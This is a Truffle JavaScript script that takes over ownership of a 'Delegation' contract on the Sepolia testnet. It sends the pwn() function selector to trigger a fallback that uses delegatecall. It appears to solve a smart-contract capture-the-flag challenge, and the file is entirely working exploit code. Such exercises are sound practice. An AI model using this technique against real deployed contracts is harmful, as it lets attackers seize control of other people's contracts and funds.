const Delegation = artifacts.require("Delegation");

module.exports = async function (callback) {
  try {
    const accounts = await web3.eth.getAccounts();
    const attacker = accounts[0];

    // Get sepolia deployed Delegation contract instance
    const delegationAddress = "0x610eF2fcc8eB5a71C43f5275a3761E85CF1dB4dF";
    const delegationInstance = new web3.eth.Contract(
      Delegation.abi,
      delegationAddress
    );

    // Check the initial owner of the Delegation contract
    // let ownerBefore = await delegationInstance.owner();
    let ownerBefore = await delegationInstance.methods.owner().call();
    console.log("Initial owner of Delegation contract:", ownerBefore);

    const hash = web3.utils.keccak256("pwn()");
    const functionSelector = hash.slice(0, 10); // Get the first 4 bytes (8 characters after '0x')
    console.log("Function Selector for pwn():", functionSelector);

    // Trigger the fallback function by sending a transaction with the function selector
    const tx = await web3.eth.sendTransaction({
      from: attacker,
      to: delegationAddress, // Address of the Delegation contract
      data: functionSelector,
    });

    console.log("Transaction sent:", tx.transactionHash);

    // Check the updated owner of the Delegation contract
    let ownerAfter = await delegationInstance.methods.owner().call();
    console.log("Updated owner of Delegation contract:", ownerAfter);

    // Verify if the attack was successful
    if (ownerAfter === attacker) {
      console.log(
        "Attack successful! You are now the owner of the Delegation contract."
      );
    } else {
      console.log("Attack failed. The owner was not updated correctly.");
    }

    callback();
  } catch (error) {
    console.error(error);
    callback(error);
  }
};
